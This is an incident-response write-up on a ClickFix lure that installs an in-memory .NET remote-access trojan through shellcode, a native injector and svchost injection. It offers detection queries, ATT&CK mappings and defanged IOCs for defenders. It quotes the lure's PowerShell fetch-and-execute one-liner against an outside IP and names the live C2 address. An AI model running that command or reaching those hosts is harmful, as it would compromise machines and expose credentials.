---
id: clickfix-clr-rat
title: "ClickFix to CLR RAT Delivery Chain"
summary: "A ClickFix PowerShell paste leads to shellcode, a native injector, and an in-memory .NET implant hiding in a Bluetooth svchost."
category: DFIR
date: 2026-10-02
tags: [clickfix, process-injection, rat, delivery-chain, windows, donut, clr]
---

# ClickFix to CLR RAT Delivery Chain

*Sanitized: no client-identifying details. IOCs shared for defensive use.*

## TL;DR

- ClickFix paste returns a shellcode runner, not the payload
- The shellcode unpacks a native injector, which injects a second binary into a Bluetooth service `svchost`
- The real implant is an in-memory .NET assembly, `sub00`
- Post-exploitation: screenshots, Edge credential access, more in-memory .NET loads

```
CLASS   : RAT delivery / process injection
VECTOR  : ClickFix (Win+R paste of a PowerShell one-liner)
IMPLANT : CLR assembly sub00, injected into svchost
C2      : 91.92.243[.]161:3038
IMPACT  : Screenshots, Edge credential access, further CLR loads
```

## Attack Chain

```
Win+R paste: PowerShell one-liner around iex(irm hxxp://158.94.211[.]77/?sid=<random>)
  → shellcode runner pulls /s_enterprise from 158.94.211[.]76
  → Donut-style loader → mod_s_enterprise (native injector)
  → fetches enterprise/student_s.bin
  → injects into svchost -k BthAppGroup (BluetoothUserService)
  → CLR assembly sub00 → C2
```

## What happened

The lure had the user press Win+R and paste a PowerShell one-liner built around `iex(irm hxxp://158.94.211[.]77/?sid=<random>)`. What comes back is a stock shellcode runner: download `s_enterprise` from a second IP, allocate executable memory, run it. Nothing interesting in the script itself.

`s_enterprise` has no PE header and looks like noise to `file` and FLOSS, so I opened it in Ghidra. It's a loader that unpacks a native payload, Donut-class behavior, though I didn't recover enough to say which builder made it. The payload is `mod_s_enterprise`, a MinGW-built injector that downloads `enterprise/student_s.bin` and targets `svchost.exe`.

Defender logged the rest. First an unbacked CLR module load, then a `CreateRemoteThreadApiCall` into `svchost.exe -k BthAppGroup -p -s BluetoothUserService`, then a second CLR assembly, `sub00`, loading inside that svchost. After that, `ScreenshotTaken`, Edge DPAPI credential access, and more unbacked CLR loads with no disk writes. The Bluetooth service looks like a convenient hiding spot rather than anything purposeful: nothing the implant did afterward was Bluetooth-specific.

Sandbox detonation of `student_s.bin` reached `91.92.243[.]161:3038` with about 28MB outbound, tagged RAT / C2. That's suspicious, but I wouldn't call it confirmed exfil without network telemetry showing direction and content.

## How I know

- **`s_enterprise` is a Donut-class loader.** `file` and FLOSS got nowhere, so I disassembled the raw x64 in Ghidra: a PEB walk via `GS:[0x30]`, export parsing with name hashing, and a context structure used to copy a payload into a buffer before both buffers get wiped. Moderate: the behavior matches Donut, but I never recovered a config, so I can't name the builder.
- **`mod_s_enterprise` is the injector.** capa hits on `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, `OpenProcess`, `AdjustTokenPrivileges` and `WinHttp*`, plus UTF-16LE strings naming `svchost.exe`, the payload host and `enterprise/student_s.bin`. High.
- **`student_s.bin` is native, not managed.** `ilspycmd` finds no managed metadata. It's a plain PE32+ x64, and its only notable string is `sub00`, alone in `.data`. High.
- **`sub00` is the in-memory CLR implant.** Defender logged a CLR assembly named `sub00` loading in the injected svchost, matching the one string in `student_s.bin`, so I'm confident that's the link. How the binary hosts the CLR I never confirmed from the imports I captured.
- **The C2 address.** It comes from the sandbox run, not from the victim host. Moderate: I'd want `DeviceNetworkEvents` before calling the 28MB exfil.

## Detection

Written for Defender XDR Advanced Hunting. They also run in Sentinel where the Defender XDR connector streams the table (`Timestamp` exists in both).

```kql
// ClickFix: Win+R entries that download and execute
// Status: untested
DeviceRegistryEvents
| where ActionType == "RegistryValueSet"
| where RegistryKey endswith @"\Explorer\RunMRU"
| where RegistryValueData has_any ("powershell", "iex", "irm", "mshta")
| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryValueData
```

```kql
// ClickFix CLR RAT: remote thread created in a Bluetooth svchost by a non-system account
// Status: untested
DeviceEvents
| where ActionType == "CreateRemoteThreadApiCall"
| where ProcessCommandLine has "BthAppGroup"
| where InitiatingProcessAccountName !in~ ("system", "local service", "network service")
| project Timestamp, DeviceName, InitiatingProcessAccountName,
          InitiatingProcessCommandLine, FileName, ProcessCommandLine
```

- An unbacked CLR module load (`DeviceEvents`, ActionType unconfirmed) inside `svchost.exe -k BthAppGroup` is rare and worth an alert on its own.
- A PowerShell command line containing both `iex` and `irm` and a bare-IP URL is the paste itself, the earliest point to catch this chain.

## ATT&CK

| ID | Technique | Where |
|----|-----------|-------|
| T1204.004 | User Execution: Malicious Copy and Paste | ClickFix paste |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Stage 1 runner |
| T1620 | Reflective Code Loading | In-memory shellcode, in-memory CLR assemblies |
| T1055 | Process Injection | `mod_s_enterprise` into svchost |
| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers | Edge DPAPI access |
| T1113 | Screen Capture | `ScreenshotTaken` |

## IOCs

### Network

```
158.94.211[.]77                                   ClickFix / Stage 1
158.94.211[.]76                                   Payload host
hxxp://158.94.211[.]76/s_enterprise               Donut shellcode
hxxp://158.94.211[.]76/enterprise/student_s.bin   Secondary PE
91.92.243[.]161:3038                              C2
```

### Hashes

```
mod_s_enterprise  4d9c5a3c56f5747ed6ae519c11e99bb56edfccb324ddf63f7ce8a7ada340485a
student_s.bin     53d83e993c624528043881ff9758ef606d77487e682230714c510b272d68b7db
```

### Host

```
CLR assemblies (in memory): jq5ksud0, sub00
Injection target: svchost.exe -k BthAppGroup -p -s BluetoothUserService
student_s.bin compiled: 2026-07-08 23:09:10 UTC
mod_s_enterprise MD5:  881d500742127a52ae5a52a29de66ffb
mod_s_enterprise SHA1: c4b150ad42a10b514a643357c8d7f9a9105f3ba1
```
